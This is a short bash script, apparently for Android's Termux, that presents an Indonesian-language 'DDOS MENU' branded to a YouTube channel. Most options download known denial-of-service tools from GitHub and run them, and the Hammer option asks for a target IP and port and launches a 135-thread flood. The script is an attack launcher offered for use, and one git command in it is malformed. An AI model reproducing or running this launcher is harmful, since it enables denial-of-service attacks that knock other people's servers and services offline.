#!/bin/bash
clear
sleep 1
echo "¡¡---------------------------!!"
echo "!! Tools By Firman YT        ¡¡"
echo "!! subscribe channel         !!"
echo "¡¡ -------Firman YT--------- ¡¡"
echo "!!___________________________!!"
echo "¿¿¿¿¿¿¿¿¿¿DDOS MENU????????????"
echo "¡¡~[1]Hammer"
echo "!!~[2]Xerxes"
echo "!!~[3]Lucinta"
echo "!!~[4]Torhshammer"
read -p "Masukan Pilihan Anda Disini :" pilih
if [ "$pilih" = "1" ]
then
echo "memulai pengisntallan hammer!!"
cd $HOME
pkg update && pkg upgrade
pkg install python
pkg install git
git clone https://github.com/cyweb/hammer
cd hammer
python hammer.py
read -p "masukan ip target :"ip
read -p "masukan portnya :"po
python hammer.py -s $ip -p $po -t 135
elif [ "$pilih" = "2" ]
then
echo "maaf kawan²,untuk tools xerxes masih dalam perbaikan.."
elif [ "$pilih" = "3" ]
then
pkg update && pkg upgrade
pkg install python
pkg install git
git clone https://github.com/zlucifer/lucita_ddos
cd lucita_ddos
chmod +x pukul.py
python pukul.py
elif [ "$pilih" = "4" ]
then
pkg update && pkg upgrade
pkg install git
pkg install python2
pkg install tor
git https://github.com/dotfighter/torshammer
cd torshammer
chmod +x *
python2 torshammer.py
fi